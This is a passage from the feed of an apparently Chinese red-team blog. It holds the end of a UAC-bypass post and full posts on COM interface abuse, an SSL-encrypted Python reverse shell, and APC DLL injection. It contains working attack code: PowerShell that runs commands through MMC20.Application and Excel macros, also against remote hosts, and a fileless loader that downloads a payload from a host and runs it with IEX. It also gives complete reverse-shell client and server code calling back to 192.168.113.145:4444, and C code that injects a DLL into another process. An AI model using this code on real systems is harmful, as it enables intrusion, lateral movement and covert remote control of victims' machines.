alt=""></p><p>然后只需要编写调用COM接口即可<br>注意：这里CPP定义的接口函数数量和IDA反编译出来的数量一样（除了要调用的函数）<br><img src="https://s1.ax1x.com/2020/10/08/0wkYXd.png" alt=""></p><p>编译好对应的dll后，使用rundll32调用效果如下<br><img src="https://s1.ax1x.com/2020/10/08/0wka7t.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果是劫持环境变量，从计划任务找bypass UAC的话注意两点： （只适用于 windows10，windows7或以下的在设置计划任务的时候，环境变量是什么就一直是那个环境变量的值，不会在改变。除非删除任务重新弄）</p><ul><li>计划任务状态为非禁用</li><li>计划任务的触发器为:启动程序 (其他的话要按照对应的触发器是触发)</li><li>详细信息的里路径程序带参数，且参数用户的用户环境变量</li></ul><p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数</p><p>一般利用COM都是自动化搜索然后人工审计多</p><p>DLL劫持因为时间问题暂时没复现</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1" target="_blank" rel="noopener">https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1</a><br><a href="https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz" target="_blank" rel="noopener">https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</a><br>COM劫持代码来源：<a href="https://www.write-bug.com/article/2000.html" target="_blank" rel="noopener">https://www.write-bug.com/article/2000.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;水了一天，明天出发准备上学。先去玩几天，早上原本就打算写&lt;br&gt;刷b站硬是刷到了晚上&lt;/p&gt;
&lt;h2 id=&quot;UAC是何物&quot;&gt;&lt;a href=&quot;#UAC是何物&quot; class=&quot;headerlink&quot; title=&quot;UAC是何物&quot;&gt;&lt;/a&gt;UAC是何物&lt;/h2&gt;&lt;blockq</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>COM接口学习与利用</title>
    <link href="http://422926799.github.io/posts/ed9cc210.html"/>
    <id>http://422926799.github.io/posts/ed9cc210.html</id>
    <published>2020-10-02T17:03:33.000Z</published>
    <updated>2020-10-02T17:18:51.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为COM"><a href="#何为COM" class="headerlink" title="何为COM"></a>何为COM</h2><p>OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。</p><p>找了篇文章编写了一个COM接口<br>参考链接:<a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br>COM接口里有个calc函数<br><img src="https://s1.ax1x.com/2020/10/03/01Qete.png" alt=""></p><p>生成DLL后，用regsvr32注册完后，可以在HKEY_CLASSES_ROOT\CLSID\下可以见到注册好的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QmfH.md.png" alt=""></p><p>使用powershell可以查询对应COM的可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;)) #枚举对于appid可用的函数$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QK1A.png" alt=""></p><p>调用对应COM接口的函数</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;))$handle.calc()</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01Q30f.png" alt=""></p><h2 id="注册表路径说明"><a href="#注册表路径说明" class="headerlink" title="注册表路径说明"></a>注册表路径说明</h2><p>HKEY_CLASSES_ROOT\CLSID 所有COM接口对应的CLSID都在这个项或子项下<br><img src="https://s1.ax1x.com/2020/10/03/01QYtg.png" alt=""></p><p>CLSID项下场见的子项</p><pre><code>* lnprocServer32* TypeLib* version* progID</code></pre><p>lnprocServer32写着这个COM接口处理的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QUpj.png" alt=""></p><p>InprocServer32写着接口的信息/版本<br><img src="https://s1.ax1x.com/2020/10/03/01Qdcn.png" alt=""></p><h2 id="枚举机器上所有的CLSID"><a href="#枚举机器上所有的CLSID" class="headerlink" title="枚举机器上所有的CLSID"></a>枚举机器上所有的CLSID</h2><p>指定类名为WIN32_DCOMApplication</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QwXq.png" alt=""></p><p>Get-CimInstance （简写：Get-cim）作用：从CIM服务器获取类的CIM实例<br><img src="https://s1.ax1x.com/2020/10/03/01QBn0.png" alt=""></p><p>CIM：公共信息模型（CIM）是用于描述受管理资源（如存储，网络或软件组件）的结构和行为的DMTF标准[DSP0004]。</p><p>查询指定CLSID可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C5EDFC9D-B018-41A4-9877-39AB18469C3A&quot;))$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QDBV.png" alt=""></p><p>快速提起所有CLSID和对应的CLSID里的函数</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication | Select-Object appid | out-file clsids.txt$Position  = 1$Filename = &quot;win10-clsid-members.txt&quot;$inputFilename = &quot;clsids.txt&quot;ForEach($CLSID in Get-Content $inputFilename) {      Write-Output &quot;$($Position) - $($CLSID)&quot;      Write-Output &quot;------------------------&quot; | Out-File $Filename -Append      Write-Output $($CLSID) | Out-File $Filename -Append      $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))      $handle | Get-Member | Out-File $Filename -Append      $Position += 1}</code></pre><p>（Method为方法，Property为参数设置之类的）<br><img src="https://s1.ax1x.com/2020/10/03/01QTAO.md.png" alt=""></p><p>枚举某个Application</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;))  $obj | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QH4e.png" alt=""></p><p>属性继续枚举</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;49B2791A-B1AE-4C90-9B8E-E860BA07F889&quot;))$obj.Document | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QL3d.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01Qvut.png" alt=""></p><h2 id="寻找可利用的COM接口"><a href="#寻找可利用的COM接口" class="headerlink" title="寻找可利用的COM接口"></a>寻找可利用的COM接口</h2><p>对应的CLSID是MMC.exe（那么是否代表着系统自带的程序可以执行命令的话，可以找找一个COM接口的函数），如果是不开源的话只能用IDA或Oleview.exe反编译了<br><img src="https://s1.ax1x.com/2020/10/03/01QzHf.md.png" alt=""></p><p>COM接口里枚举出来的函数（如果是微软公开的话）可以到：<a href="https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=</a> 搜索<br>例如：ExecuteShellCommand <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand</a><br><img src="https://s1.ax1x.com/2020/10/03/01l9US.png" alt=""></p><p>调用函数（注意:如果注册表查询CLSID子项带有ProgID的话需要指定ProgID调用方法或属性）<br><img src="https://s1.ax1x.com/2020/10/03/01lC4g.png" alt=""></p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lkgs.png" alt=""></p><p>思考：能不能通过微软文档搜索比如什么：Exec,command,file.urldownload这些函数，如果找的到在CLSID项里搜索对应的exe/dll，然后调用呢。或在HKEY_CLASSES_ROOT\CLSID下寻找有ProgID的子项CLSID，寻找可利用项。为什么要找带有ProgID子项的CLSID？因为这些一般都是系统自带的</p><h2 id="利用COM接口"><a href="#利用COM接口" class="headerlink" title="利用COM接口"></a>利用COM接口</h2><p>可以根据对应COM接口枚举出的函数名进行分析，或者猜解。例如</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;00020906-0000-0000-C000-000000000046&quot;))$handle.ExecuteExcel4Macro(&quot;EXEC(&quot;&quot;calc.exe&quot;&quot;)&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lK5F.png" alt=""></p><blockquote><p>比如，F5078F35-C551-11D3-89B9-0000F81FE221}这个COM对象（Msxml2.XMLHTTP.3.0）对外提供了一个XML HTTP 3.0功能，可以用来下载任意代码并执行，无需将payload写入磁盘，也不会触发基于System.Net.WebClient的常用检测规则。XML HTTP 3.0对象通常用来发起AJAX请求。在这种情况下，获取数据的方式非常简单，直接使用Invoke-Expression cmdlet（IEX）即可。</p></blockquote><pre><code>$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;));$o.Open(&quot;GET&quot;, &quot;http://192.168.1.106/payload.txt&quot;, $False);$o.Send();IEX $o.responseText;</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01l129.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01l3vR.png" alt=""></p><p>对应的open函数反汇编<br><img src="https://s1.ax1x.com/2020/10/03/01lGK1.png" alt=""></p><p>文章里有用 Oleview.exe进行对dll的反编译，也有用IDA对指定DLL的函数进行分析。需要一定的基础进行分析<br>COM的利用方式：</p><pre><code>* 寻找COM接口对应注册表的lnprocServer32缺少的dll/exe替换进行提权* 利用COM接口远程调用</code></pre><p>COM远程利用：</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.113.130&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lJDx.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01lYb6.md.png" alt=""></p><p>参考链接:<br><a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br><a href="https://www.anquanke.com/post/id/217928" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217928</a><br><a href="https://www.anquanke.com/post/id/179927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179927</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;何为COM&quot;&gt;&lt;a href=&quot;#何为COM&quot; class=&quot;headerlink&quot; title=&quot;何为COM&quot;&gt;&lt;/a&gt;何为COM&lt;/h2&gt;&lt;p&gt;OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>ssl反弹shell(py)</title>
    <link href="http://422926799.github.io/posts/aa01a75d.html"/>
    <id>http://422926799.github.io/posts/aa01a75d.html</id>
    <published>2020-09-25T06:40:50.000Z</published>
    <updated>2020-09-25T06:49:38.220Z</updated>
    
    <content type="html"><![CDATA[<p>之前在星球发过一个py反弹windows shell的。昨天看了篇py ssl反弹shell的<br>想着把之前那个也改一下</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>openssl生成证书</p><pre><code>openssl genrsa -out server.key 1024openssl req -new -x509 -days 3650 -key server.key -out server.crt -subj &quot;/C=CN/ST=mykey/L=mykey/O=mykey/OU=mykey/CN=domain1/CN=domain2/CN=domain3&quot;</code></pre><p>server：</p><pre><code class="python">import socketimport sslimport optparseimport osdef main(ip,port,cert,key):    try:        port=int(port)    except:        print(&quot;[-] set port 1-65535&quot;)        exit()    if os.path.exists(cert) and os.path.exists(key):        pass    else:        print(&quot;[-] ssl cert:{} or ssl key:{} not found&quot;.format(cert,key))        exit()    print(&quot;bind {}:{}&quot;.format(ip,port))    s=socket.socket()    ssl_s=ssl.wrap_socket(s,certfile=cert,keyfile=key,                          ssl_version=ssl.PROTOCOL_TLSv1)    ssl_s.bind((str(ip),port))    ssl_s.listen(3)    conn, addr = ssl_s.accept()    print(&quot;[+] connection {}&quot;.format(addr))    while True:        user = input()        if len(user)&gt;0:            conn.sendall(user.encode())        else:            continue        data=b&quot;&quot;        cmdlen = conn.recv(99999)        cmdlen=int(cmdlen)        while len(data)&lt;cmdlen:            data+=conn.recv(99999)        print(data.decode())if __name__ == &#39;__main__&#39;:    parser=optparse.OptionParser()    parser.add_option(&quot;-i&quot;,dest=&quot;ip&quot;,help=&quot;set ip&quot;)    parser.add_option(&quot;-p&quot;,dest=&quot;port&quot;,help=&quot;set port&quot;)    parser.add_option(&quot;-c&quot;,dest=&quot;cert&quot;,help=&quot;set ssl cert&quot;)    parser.add_option(&quot;-k&quot;,dest=&quot;key&quot;,help=&quot;set ssl key&quot;)    option,args=parser.parse_args()    if option.ip and option.port and option.cert and option.key:        main(option.ip,option.port,option.cert,option.key)    else:        parser.print_help()        print(&quot;Example:python server.py -i &lt;ip&gt; -p &lt;port&gt; -c &lt;sslcert&gt; -k &lt;sslkey&gt;&quot;)</code></pre><p>client.py</p><pre><code class="py">import socketimport osimport reimport ssls=socket.socket()s=ssl.wrap_socket(s,ssl_version=ssl.PROTOCOL_TLSv1)s.connect((&quot;192.168.113.145&quot;,4444))while True:    path=os.getcwd()    data=s.recv(1024).decode().rstrip(&#39;\n&#39;)    if len(data)&gt;0:        data=&quot;cd /d {}&amp;&quot;.format(os.getcwd())+data+&quot;&amp;echo [S]&amp;cd&amp;echo [E]&quot;        cmd = os.popen(data).read()        path2 = re.findall(&quot;\[S\]\n.*\n\[E\]&quot;, cmd)        if len(path2) &gt; 0:            path = str(path2[0]).replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;[S]&quot;, &quot;&quot;).replace(&quot;[E]&quot;, &quot;&quot;)            os.chdir(path)        cmd=re.sub(&quot;\[S\]\n.*\n\[E\]&quot;,&quot;&quot;,cmd)        sed=cmd+path+&quot;&gt;&quot;        cmd_length=str(len(sed.encode(&quot;utf-8&quot;))).encode()        cmd_data=sed.encode(&quot;utf-8&quot;)        s.sendall(cmd_length)        s.sendall(cmd_data)    else:        s.sendall(path.encode(&quot;utf-8&quot;))</code></pre><p>效果如下：<br><img src="https://s1.ax1x.com/2020/09/25/09dPJS.png" alt="09dPJS.png"><br><img src="https://s1.ax1x.com/2020/09/25/09diRg.png" alt="09diRg.png"></p><p>找个时间写个golang的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前在星球发过一个py反弹windows shell的。昨天看了篇py ssl反弹shell的&lt;br&gt;想着把之前那个也改一下&lt;/p&gt;
&lt;h2 id=&quot;code&quot;&gt;&lt;a href=&quot;#code&quot; class=&quot;headerlink&quot; title=&quot;code&quot;&gt;&lt;/a&gt;code</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>APC dll注入</title>
    <link href="http://422926799.github.io/posts/c9faf9c0.html"/>
    <id>http://422926799.github.io/posts/c9faf9c0.html</id>
    <published>2020-09-24T04:27:53.000Z</published>
    <updated>2020-09-24T04:32:13.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理和要求"><a href="#原理和要求" class="headerlink" title="原理和要求"></a>原理和要求</h2><p>APC注入原理：<br>APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入。</p><p>APC注入要求：</p><pre><code>1.必须是多线程环境下2.注入的程序必须会调用上面的那些同步对象.那么我们可以注入APC,注意下条件,也不是所有都能注入的.注入方法的原理:1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数3.我们利用QueueUserApc,往这个队列中插入一个回调4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><pre><code class="c">#include &quot;stdafx.h&quot;#include&lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;void GetErr() {        printf(&quot;Error:%d&quot;, GetLastError());        printf(&quot;\n&quot;);        exit(1);}int getprocess(WCHAR *processname) {        HANDLE  data = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        if (data == INVALID_HANDLE_VALUE) {               printf(&quot;[-] CreateToolhelp32Snapshot failure&quot;);               GetErr();        }        else {               PROCESSENTRY32W pe = { sizeof(pe) };               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               for (bool dd = Process32FirstW(data, &amp;pe);dd;dd = Process32NextW(data,  &amp;pe)) {                       WCHAR *pname = pe.szExeFile;                       int pid = pe.th32ProcessID;                       if (wcscmp(processname, pname) == 0) {                              WCHAR info[650] =TEXT(&quot;name:&quot;);                              lstrcatW(info, pname);                              lstrcatW(info, TEXT(&quot; &quot;));                              wprintf(info);                              wprintf(TEXT(&quot;pid:&quot;));                              printf(&quot;%d\n&quot;, pid);                              return pid;                       }               }        }        return 0;}BOOL apcinject(int pid,WCHAR *dll) {        HANDLE openprocess = OpenProcess(PROCESS_ALL_ACCESS,0 ,pid);        if (openprocess == 0) {               GetErr();        }        else {               printf(&quot;[*] OpenProcess Sucess\n&quot;);        }        LPVOID vt = VirtualAllocEx(openprocess, 0, 1024, MEM_COMMIT,  PAGE_EXECUTE_READWRITE);        if (vt == 0) {               printf(&quot;[-] VirtualAllocEx faliure\n&quot;);               GetErr();        }        else {               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);        }        SIZE_T dwRet;        bool write = WriteProcessMemory(openprocess, vt, dll, MAX_PATH, &amp;dwRet);        if (write == 0) {               printf(&quot;[-] WriteProcessMemory faiure&quot;);               GetErr();        }        else {               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        }        THREADENTRY32 te = { sizeof(te) };        HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);        if (handleSnap == INVALID_HANDLE_VALUE)        {               printf(&quot;[-] CreateToolhelp32Snapshot faiure&quot;);               GetErr();        }else {               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               /*               if (Thread32First(handleSnap, &amp;te))               {                       do {                              if (te.th32OwnerProcessID == pid)                              {                                      printf(&quot;%d\n&quot;, te.th32OwnerProcessID);                              }                       } while (Thread32Next(handleSnap, &amp;te));               }                       */               for (bool td = Thread32First(handleSnap, &amp;te);td;td =  Thread32Next(handleSnap, &amp;te)) {                       if (te.th32OwnerProcessID == pid) {                              int tid = te.th32ThreadID;                              HANDLE openthread = OpenThread(THREAD_ALL_ACCESS, 0, tid);                              if (openthread == 0) {                                      printf(&quot;[-] OpenThread faiure&quot;);                                      GetErr();                              }                              else {                                      printf(&quot;[*] OpenThread Sucess threadid:%d\n&quot;,tid);                                      DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW,  openthread, (ULONG_PTR)vt);                                      if (dwRet == 0) {                                             printf(&quot;[-] QueueUserAPC failure\n&quot;);                                             GetErr();                                      }                                      else {                                             printf(&quot;[+] APC Dll inject Sucess\n&quot;);                                      }                              }                       }               }        }        return true;}int main(){        WCHAR *name = TEXT(&quot;calc.exe&quot;);        WCHAR *dll = TEXT(&quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;);        int pid = getprocess(name);        if (pid != 0) {               apcinject(pid, dll);        }        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/24/wzcGgU.png" alt=""></p><p>试了一下，explorer、calc都能注</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原理和要求&quot;&gt;&lt;a href=&quot;#原理和要求&quot; class=&quot;headerlink&quot; title=&quot;原理和要求&quot;&gt;&lt;/a&gt;原理和要求&lt;/h2&gt;&lt;p&gt;APC注入原理：&lt;br&gt;APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL</summary>
      
    
    
    
    
  </entry>
  
</feed>
